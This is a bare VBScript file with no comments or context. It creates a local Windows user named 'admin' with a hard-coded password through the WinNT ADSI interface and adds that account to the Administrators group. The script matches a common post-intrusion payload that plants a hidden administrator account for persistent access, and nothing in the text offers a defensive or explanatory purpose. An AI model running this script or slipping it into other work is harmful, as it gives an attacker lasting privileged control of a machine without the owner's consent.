set wsnetwork=CreateObject("WSCRIPT.NETWORK")
os="WinNT://"&wsnetwork.ComputerName
Set ob=GetObject(os)
Set oe=GetObject(os&"/Administrators,group")
Set od=ob.Create("user","admin")
od.SetPassword "Love@123456"
od.SetInfo
Set of=GetObject(os&"/admin",user)
oe.add os&"/admin"